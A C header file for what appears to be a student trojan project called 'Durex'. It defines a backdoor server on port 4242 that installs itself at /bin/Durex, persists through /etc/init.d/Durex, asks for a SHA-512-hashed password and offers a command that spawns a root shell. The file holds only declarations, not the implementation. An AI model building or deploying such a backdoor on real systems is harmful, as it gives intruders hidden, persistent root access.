#ifndef DUREX_H

# define DUREX_H

# include <unistd.h>
# include <stdlib.h>
# include <arpa/inet.h>
# include <netdb.h>
# include <netinet/in.h>
# include <netinet/ip_icmp.h>
# include <sys/param.h>
# include <sys/socket.h>
# include <sys/stat.h>
# include <sys/time.h>
# include <sys/types.h>
# include <sys/select.h>
# include <stdio.h>
# include <fcntl.h>
# include "libft.h"

# define PAYLOAD_PORT 4242
# define MAX_CLIENTS 3
# define CLIENT_BUFFER_SIZE 4096
# define PAYLOAD_PATH "/bin/Durex"
# define INIT_PATH "/etc/init.d/Durex"
# define TROJAN_STR "ndombre / justasze"
# define PASSWD_STR "4f5aa3f35a25d0c309d8420d56fa998bacaa46b3422969906b014a422c2625973bbfa6356178407f40f3fb78241229cf9ec0741ea5264289d2019bd4262c04c3"

# define CONNEXION_PROMPT "Greetings. Please enter the password: "
# define WRONG_PASSWORD "Wrong password. You are unworthy. Farewell.\n"
# define WELCOME_MESSAGE "Welcome, kind sir!\n"
# define COMMAND_PROMPT "#> "
# define COMMAND_TOO_LONG "Your command is too long to process, sorry.\n"
# define HELP_MESSAGE1 "Accepted commands:\nhelp - shows this message\n"
# define HELP_MESSAGE2 "shell - spawns a root shell\nexit - disconnect from server\n"
# define HELP_MESSAGE HELP_MESSAGE1 HELP_MESSAGE2
# define UNKNOWN_COMMAND "Unknown command, type help to get a list of valid commands.\n"
# define SHELL_FAILED_MESSAGE "Unable to open shell because of reasons, sorry mate\n"

typedef struct s_server_data t_server_data;

typedef struct	s_client_data
{
	int			is_logged;
	int			fd;
	char		read_buffer[CLIENT_BUFFER_SIZE];
	char		write_buffer[CLIENT_BUFFER_SIZE];
	size_t		wbuffer_pos;
	size_t		rbuffer_pos;
	void		(*read_function)(t_server_data*, size_t);
	void		(*write_function)(t_server_data*, size_t);
}				t_client_data;


struct		s_server_data
{
	int				server_fd;
	t_client_data	clients[MAX_CLIENTS];
	int				highest_fd;
	int				nb_ready_fds;
	fd_set			fd_read;
	fd_set			fd_write;
};

void	server_loop(t_server_data *data);
void	client_read(t_server_data *data, size_t client_id);
int		sha512(uint32_t out[16], void *in, uint64_t size);

#endif
